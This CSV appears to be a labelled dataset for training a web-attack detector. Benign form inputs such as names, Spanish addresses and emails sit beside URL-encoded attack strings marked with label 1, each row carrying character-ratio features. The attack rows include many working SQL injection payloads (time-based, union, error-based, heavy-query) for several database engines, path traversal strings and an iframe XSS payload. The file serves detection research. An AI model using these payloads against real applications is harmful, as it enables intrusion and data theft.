payload,payload_len,alpha,non_alpha,attack_feature,label
madrid,6,100.0,0.0,0.0,0
-3597%27%29%29%20order%20by%201--,21,71.42857142857143,28.57142857142857,30000.0,1
fisterra,8,100.0,0.0,0.0,0
vilassar%20de%20mar,15,100.0,0.0,0.0,0
1%25%27%29%29%20or%20elt%285873%3D5873%2Csleep%285%29%29%23,33,66.66666666666666,33.33333333333333,30000.0,1
......web-infweb.xml,20,100.0,0.0,0.0,1
-7776%27%29%20or%205023%3Dctxsys.drithsx.sn%285023%2C%28chr%28113%29%7C%7Cchr%28113%29%7C%7Cchr%28112%29%7C%7Cchr%28106%29%7C%7Cchr%28113%29%7C%7C%28select%20%28case%20when%20%285023%3D5023%29%20then%201%20else%200%20end%29%20from%20dual%29%7C%7Cchr%28113,220,54.54545454545454,17.727272727272727,60000.0,1
1%29%20as%20fhvr%20where%205544%3D5544%3Biif%285257%3D5257%2C1%2C1/0%29,47,80.85106382978722,19.148936170212767,30000.0,1
93026638x,9,100.0,0.0,0.0,0
1%22%20where%206785%3D6785%20and%203580%3D%28select%20count%28%2A%29%20from%20domain.domains%20as%20t1%2Cdomain.columns%20as%20t2%2Cdomain.tables%20as%20t3%29--,114,86.8421052631579,13.157894736842104,90000.0,1
60537126e,9,100.0,0.0,0.0,0
10261,5,100.0,0.0,0.0,0
corazoncill2,12,100.0,0.0,0.0,0
foote%40tecnoindomo.ad,20,100.0,0.0,0.0,0
9.49516E+15,16,68.75,31.25,45.45454545454545,0
-4721%27%29%20or%20elt%284378%3D5165%2C5165%29%20and%20%28%27fufn%27%3D%27fufn,48,75.0,25.0,60000.0,1
3.37612E+15,16,68.75,31.25,45.45454545454545,0
1%27%20or%20extractvalue%281297%2Cconcat%280x5c%2C0x7171706a71%2C%28select%20%28elt%281297%3D1297%2C1%29%29%29%2C0x717a767a71%29%29,91,81.31868131868131,18.681318681318682,30000.0,1
-9975%20where%209760%3D9760%20order%20by%201--,34,88.23529411764706,11.76470588235294,60000.0,1
1%27%29%29%20as%20pstn%20where%206691%3D6691%20and%204241%3Dconvert%28int%2C%28select%20char%28113%29%2Bchar%28113%29%2Bchar%28112%29%2Bchar%28106%29%2Bchar%28113%29%2B%28select%20%28case%20when%20%284241%3D4241%29%20then%20char%2849%29%20else%20char%2848%29%20end%29%29%2Bchar%28113%29%2Bchar%28122%29%2Bchar%28118%29%2Bchar%28122%29%2Bchar%28113%29%29%29--,226,76.54867256637168,23.451327433628318,60000.0,1
1%27%29%29%29%20and%20char%28120%29%7C%7Cchar%28106%29%7C%7Cchar%28117%29%7C%7Cchar%2885%29%3Dregexp_substring%28repeat%28right%28char%289981%29%2C0%29%2C5000000000%29%2Cnull%29%20and%20%28%28%28%27cenk%27%3D%27cenk,133,71.42857142857143,28.57142857142857,60000.0,1
-8005%22%29%20union%20all%20select%205213%2C5213%2C5213%2C5213%2C5213--,51,82.35294117647058,17.647058823529413,60000.0,1
acrianzada,10,100.0,0.0,0.0,0
c/%20paterna%2C%20s/n%2C%2011h,20,100.0,0.0,0.0,0
hensley,7,100.0,0.0,0.0,0
-6754%27%29%20where%208388%3D8388%20union%20all%20select%208388%2C8388%2C8388%2C8388%2C8388--,67,85.07462686567165,14.925373134328357,90000.0,1
5.93447E+15,16,68.75,31.25,45.45454545454545,0
1%25%27%29%29%29%3Bselect%20%2A%20from%20generate_series%284592%2C4592%2Ccase%20when%20%284592%3D4592%29%20then%201%20else%200%20end%29%20limit%201--,97,82.4742268041237,17.525773195876287,30000.0,1
3.98568E+14,16,68.75,31.25,45.45454545454545,0
calle%20de%20circulacio%20de%20l%27%20oest%2C%207,33,96.96969696969697,3.030303030303031,3.125000000000001,0
kuenneke%40portaldesign.dk,24,100.0,0.0,0.0,0
cosmlogo,8,100.0,0.0,0.0,0
......................../windows/win.ini,40,100.0,0.0,0.0,1
dac%40eonon.com.cy,16,100.0,0.0,0.0,0
2829,4,100.0,0.0,0.0,0
aristteles,10,100.0,0.0,0.0,0
hi9dra,6,100.0,0.0,0.0,0
calle%20hemingway%2C%20s/n,20,100.0,0.0,0.0,0
berg%40esposo.com.ve,18,100.0,0.0,0.0,0
mo19bun0a,9,100.0,0.0,0.0,0
7098,4,100.0,0.0,0.0,0
1%25%22%29%20or%207552%3D%28select%20count%28%2A%29%20from%20rdb%24fields%20as%20t1%2Crdb%24types%20as%20t2%2Crdb%24collations%20as%20t3%2Crdb%24functions%20as%20t4%29%20and%20%28%22%25%22%3D%22,120,81.66666666666667,18.333333333333332,90000.0,1
89c3via,7,100.0,0.0,0.0,0
33829,5,100.0,0.0,0.0,0
subida%20san%20diego%208%2C%2013%3Fc,24,100.0,0.0,0.0,0
75,2,100.0,0.0,0.0,0
-4637%27%20or%203440%3Dcast%28%28chr%28113%29%7C%7Cchr%28113%29%7C%7Cchr%28112%29%7C%7Cchr%28106%29%7C%7Cchr%28113%29%29%7C%7C%28select%20%28case%20when%20%283440%3D3440%29%20then%201%20else%200%20end%29%29%3A%3Atext%7C%7C%28chr%28113%29%7C%7Cchr%28122%29,192,54.6875,22.916666666666664,30000.0,1
yuvia,5,100.0,0.0,0.0,0
ca%3Fseosa,8,100.0,0.0,0.0,0
%3Ciframe%20id%3Dxss%20%22onload%3Dalert%28/xss/%29%3E%3C/iframe%3E,45,84.44444444444444,15.555555555555557,18.42105263157895,1
mendie,6,100.0,0.0,0.0,0
d.antoni,8,100.0,0.0,0.0,0
poblacin%20de%20campos,18,100.0,0.0,0.0,0
04137943j,9,100.0,0.0,0.0,0
watanabe,8,100.0,0.0,0.0,0
poveda,6,100.0,0.0,0.0,0
39100,5,100.0,0.0,0.0,0
mcavoy-zabczynski%40discotecateatre.gt,36,100.0,0.0,0.0,0
36628106p,9,100.0,0.0,0.0,0
san%20petersburgo%2C%20165,20,100.0,0.0,0.0,0
1%27%29%29%29%20or%20%28select%202%2A%28if%28%28select%20%2A%20from%20%28select%20concat%280x7171706a71%2C%28select%20%28elt%288113%3D8113%2C1%29%29%29%2C0x717a767a71%2C0x78%29%29s%29%2C%208446744073709551610%2C%208446744073709551610%29%29%29%20and%20%28%28%28%27qpuy%27%3D%27qpuy,180,78.88888888888889,21.11111111111111,90000.0,1
mo%21ralidad,10,90.0,10.0,11.11111111111111,0
navaescurial,12,100.0,0.0,0.0,0
1%25%22%29%29%29%20and%20%283020%3D3020%29%2A6703%20and%20%28%28%28%22%25%22%3D%22,40,57.49999999999999,42.5,60000.0,1
40190,5,100.0,0.0,0.0,0
1%27%29%20or%20row%281045%2C7562%29%3E%28select%20count%28%2A%29%2Cconcat%280x7171706a71%2C%28select%20%28elt%281045%3D1045%2C1%29%29%29%2C0x717a767a71%2Cfloor%28rand%280%29%2A2%29%29x%20from%20%28select%208488%20union%20select%205584%20union%20select%203051%20union%20select%201210%29a%20group%20by%20x%29%20and%20%28%27zypa%27%3D%27zypa,222,83.33333333333334,16.666666666666664,270000.0,1
calle%20pea%20de%20francia%2C%2058%2C,25,100.0,0.0,0.0,0
santa%20agueda%2054%2C%201%3Fc,20,100.0,0.0,0.0,0
sant%20vicen%20de%20castellet,23,100.0,0.0,0.0,0
-5529%22%20or%205903%3D%28%27qqpjq%27%7C%7C%28select%20case%205903%20when%205903%20then%201%20else%200%20end%20from%20rdb%24database%29%7C%7C%27qzvzq%27%29,99,83.83838383838383,16.161616161616163,60000.0,1
1%27%20where%205023%3D5023%20and%203580%3D%28select%20count%28%2A%29%20from%20domain.domains%20as%20t1%2Cdomain.columns%20as%20t2%2Cdomain.tables%20as%20t3%29--,114,86.8421052631579,13.157894736842104,90000.0,1
78977050h,9,100.0,0.0,0.0,0
larisa,6,100.0,0.0,0.0,0
1%29%29%20union%20all%20select%20null%2Cnull%2Cnull%23,36,86.11111111111111,13.88888888888889,60000.0,1
44340,5,100.0,0.0,0.0,0
canino,6,100.0,0.0,0.0,0
-6848%22%29%29%20or%204071%3D5312,21,76.19047619047619,23.809523809523807,30000.0,1
cherwin4%40xavipetit.mu,21,100.0,0.0,0.0,0
c/%20balanegra%2057%208%3Fa,19,100.0,0.0,0.0,0
1%27%29%29%20and%20elt%281210%3D1210%2Csleep%285%29%29%20and%20%28%28%27jnmf%27%3D%27jnmf,51,70.58823529411765,29.411764705882355,60000.0,1
1%29%29%3Bcall%20regexp_substring%28repeat%28left%28crypt_key%28char%2865%29%7C%7Cchar%2869%29%7C%7Cchar%2883%29%2Cnull%29%2C0%29%2C500000000%29%2Cnull%29%20and%20%28%283127%3D3127,118,74.57627118644068,25.423728813559322,30000.0,1
-6855%27%29%20or%208519%3D9248,20,80.0,20.0,30000.0,1
c7ada98o,8,100.0,0.0,0.0,0
9.45727E+14,16,68.75,31.25,45.45454545454545,0
garrotxa%2C%20118,13,100.0,0.0,0.0,0
zarlenga,8,100.0,0.0,0.0,0
1.13313E+15,16,68.75,31.25,45.45454545454545,0
1894,4,100.0,0.0,0.0,0
59072549q,9,100.0,0.0,0.0,0
64079837c,9,100.0,0.0,0.0,0
1%20where%205627%3D5627%20and%203202%3Dlike%28%27abcdefg%27%2Cupper%28hex%28randomblob%28500000000/2%29%29%29%29--,80,80.0,20.0,69000.0,1
1%22%29%20as%20esks%20where%201138%3D1138%3Bcreate%20or%20replace%20function%20sleep%28int%29%20returns%20int%20as%20%27/lib/libc.so.6%27%2C%27sleep%27%20language%20%27c%27%20strict%3B%20select%20sleep%285%29--,144,84.72222222222221,15.277777777777779,90000.0,1
1%22%29%29%20and%207533%3D7533%20and%20%28%28%22gkca%22%3D%22gkca,37,72.97297297297297,27.027027027027028,60000.0,1
1%29%20where%208232%3D8232%20and%20%283020%3D3020%29%2A6703--,41,80.48780487804879,19.51219512195122,60000.0,1
d4s,3,100.0,0.0,0.0,0
1%25%27%29%29%20and%205556%3D%28select%20count%28%2A%29%20from%20all_users%20t1%2Call_users%20t2%2Call_users%20t3%2Call_users%20t4%2Call_users%20t5%29%20and%20%28%28%27%25%27%3D%27,114,77.19298245614034,22.807017543859647,90000.0,1
villaturiel,11,100.0,0.0,0.0,0
homan,5,100.0,0.0,0.0,0
-9327%27%29%20or%203038%3D3038,20,80.0,20.0,30000.0,1
alfio,5,100.0,0.0,0.0,0
niwinska%40estudiodeyoga.td,25,100.0,0.0,0.0,0
50780,5,100.0,0.0,0.0,0
alcalde%20isidoro%20enciso%2C%20100%206%3Fg,31,100.0,0.0,0.0,0
raudres,7,100.0,0.0,0.0,0
7as72110,8,100.0,0.0,0.0,0
syamala,7,100.0,0.0,0.0,0
ax,2,100.0,0.0,0.0,0
1%25%22%29%3Bselect%20pg_sleep%285%29%20and%20%28%22%25%22%3D%22,34,61.76470588235294,38.23529411764706,30000.0,1
1%22%3Bselect%20like%28%27abcdefg%27%2Cupper%28hex%28randomblob%28500000000/2%29%29%29%29%20and%20%22ejmj%22%20like%20%22ejmj,83,79.51807228915662,20.481927710843372,69000.0,1
soulef,6,100.0,0.0,0.0,0
13420,5,100.0,0.0,0.0,0
33317,5,100.0,0.0,0.0,0
aragons,7,100.0,0.0,0.0,0
pelayos,7,100.0,0.0,0.0,0
shazmnn,7,100.0,0.0,0.0,0
1%27%3Bbegin%20dbms_lock.sleep%285%29%3B%20end%20and%20%27aenf%27%3D%27aenf,49,77.55102040816327,22.448979591836736,30000.0,1
9.97809E+15,16,68.75,31.25,45.45454545454545,0
osburn,6,100.0,0.0,0.0,0
vinasco%20pomar,13,100.0,0.0,0.0,0
weldon%40latiendadecolchones.ec,29,100.0,0.0,0.0,0
shdanoff%40esposo.com.tj,22,100.0,0.0,0.0,0
-6813%29%29%29%20or%206872%3D6872%20and%20%28%28%287304%3D7304,38,76.31578947368422,23.684210526315788,60000.0,1
1%27%3Bselect%20case%20when%207426%3D6635%20then%201%20else%20null%20end--,52,96.15384615384616,3.8461538461538396,3.9999999999999933,1
7016,4,100.0,0.0,0.0,0
plza.%20de%20los%20conquistadores%20182,31,100.0,0.0,0.0,0
1%27%20or%206793%3D%28select%206793%20from%20pg_sleep%285%29%29%20and%20%27hokd%27%3D%27hokd,58,81.03448275862068,18.96551724137931,90000.0,1
1%25%27%29%29%29%20union%20all%20select%20null%2Cnull%2Cnull%2Cnull%2Cnull%2Cnull%2Cnull%2Cnull%2Cnull--,70,78.57142857142857,21.428571428571427,60000.0,1
gottschlich_candy%40piaceredelivery.pk,36,100.0,0.0,0.0,0
7661,4,100.0,0.0,0.0,0
calle%20teniente%20bragado%20139%207%3Fe,30,100.0,0.0,0.0,0
1%20and%206510%3D%28select%20count%28%2A%29%20from%20sysusers%20as%20sys1%2Csysusers%20as%20sys2%2Csysusers%20as%20sys3%2Csysusers%20as%20sys4%2Csysusers%20as%20sys5%2Csysusers%20as%20sys6%2Csysusers%20as%20sys7%29%23%20kkmw,158,91.77215189873418,8.227848101265822,60000.0,1
superable,9,100.0,0.0,0.0,0
pro8i2ic6r,10,100.0,0.0,0.0,0
malapeir%20cavaller,17,100.0,0.0,0.0,0
carretera%20rubi%20106,18,100.0,0.0,0.0,0
-1337%22%29%20union%20all%20select%207508--,31,83.87096774193549,16.129032258064516,60000.0,1
1%25%27%29%3Bselect%20%28case%20when%20%283773%3D3722%29%20then%203773%20else%203773%2A%28select%203773%20from%20mysql.db%29%20end%29%23,88,84.0909090909091,15.909090909090908,30000.0,1
estaol%20bellet,13,100.0,0.0,0.0,0
1%22%29%29%20as%20qhnb%20where%208302%3D8302%20and%20%283020%3D3020%29%2A6703--,51,80.3921568627451,19.607843137254903,60000.0,1
hays_adiarte%40lingotes.com.je,28,100.0,0.0,0.0,0
1%22%29%29%29%20and%208514%3D%28select%20count%28%2A%29%20from%20domain.domains%20as%20t1%2Cdomain.columns%20as%20t2%2Cdomain.tables%20as%20t3%29%20and%20%28%28%28%22xnsj%22%20like%20%22xnsj,124,83.06451612903226,16.93548387096774,120000.0,1
1%22%29%20as%20eibf%20where%205026%3D5026%20and%204386%3Dutl_inaddr.get_host_address%28chr%28113%29%7C%7Cchr%28113%29%7C%7Cchr%28112%29%7C%7Cchr%28106%29%7C%7Cchr%28113%29%7C%7C%28select%20%28case%20when%20%284386%3D4386%29%20then%201%20else%200%20end%29%20from%20dual%29%7C%7Cchr%28113%29%7C%7Cchr%28122%29%7C%7Cchr%28118%29%7C%7Cchr%28122%29%7C%7Cchr%28113%29%29--,228,74.12280701754386,25.877192982456144,90000.0,1
1%22%29%29%20rlike%20%28select%20%2A%20from%20%28select%28sleep%285%29%29%29sgvo%29%20and%20%28%28%22grct%22%3D%22grct,68,73.52941176470588,26.47058823529412,60000.0,1
ursala,6,100.0,0.0,0.0,0
morea,5,100.0,0.0,0.0,0
23715739w,9,100.0,0.0,0.0,0
noris,5,100.0,0.0,0.0,0
ua%20de%20quintana,14,100.0,0.0,0.0,0
ca26lot9,8,100.0,0.0,0.0,0
48673442z,9,100.0,0.0,0.0,0
1%27%20and%203707%3D%28select%20count%28%2A%29%20from%20sysibm.systables%20as%20t1%2Csysibm.systables%20as%20t2%2Csysibm.systables%20as%20t3%29,103,88.3495145631068,11.650485436893204,60000.0,1
i-chao,6,100.0,0.0,0.0,0
maciel,6,100.0,0.0,0.0,0
bar7ech7r5,10,100.0,0.0,0.0,0
1%29%29%29%3Bselect%20count%28%2A%29%20from%20rdb%24fields%20as%20t1%2Crdb%24types%20as%20t2%2Crdb%24collations%20as%20t3%2Crdb%24functions%20as%20t4%20and%20%28%28%281105%3D1105,116,84.48275862068965,15.517241379310345,60000.0,1
1%27%2C%28select%20%28case%20when%20%281570%3D1570%29%20then%20%28select%201570%20from%20pg_sleep%285%29%29%20else%201/%28select%200%29%20end%29%29,93,81.72043010752688,18.27956989247312,30000.0,1
1%29%29%29%20and%20sleep%285%29%23,18,66.66666666666666,33.33333333333333,30000.0,1
8.32244E+15,16,68.75,31.25,45.45454545454545,0
1%22%29%29%28select%20%28case%20when%20%285451%3D5451%29%20then%20regexp_substring%28repeat%28right%28char%285451%29%2C0%29%2C500000000%29%2Cnull%29%20else%20char%28108%29%7C%7Cchar%2876%29%7C%7Cchar%28112%29%7C%7Cchar%28116%29%20end%29%20from%20information_schema.system_users%29%20and%20%28%28%22rfam%22%20like%20%22rfam,214,79.43925233644859,20.5607476635514,90000.0,1
400ol4,6,100.0,0.0,0.0,0
-7737%27%7C%7C%28select%20%27xalo%27%20where%209219%3D9219%20union%20all%20select%209219%2C9219%2C9219%2C9219%23,76,84.21052631578947,15.789473684210526,90000.0,1
nogueira%40magritte.ly,20,100.0,0.0,0.0,0
el%20reyezuelo%2C%2015,16,100.0,0.0,0.0,0
1%22%29%20as%20lkzz%20where%203565%3D3565%20and%20char%28120%29%7C%7Cchar%28106%29%7C%7Cchar%28117%29%7C%7Cchar%2885%29%3Dregexp_substring%28repeat%28right%28char%289981%29%2C0%29%2C5000000000%29%2Cnull%29--,137,76.64233576642336,23.357664233576642,60000.0,1
newtell%40theroxyblue.ir,22,100.0,0.0,0.0,0
wernher,7,100.0,0.0,0.0,0
chumbiauca,10,100.0,0.0,0.0,0
torgo,5,100.0,0.0,0.0,0
benigni%40viajesdacapalla.pa,26,100.0,0.0,0.0,0
kamekona%40gopersonaltrainers.fj,30,100.0,0.0,0.0,0
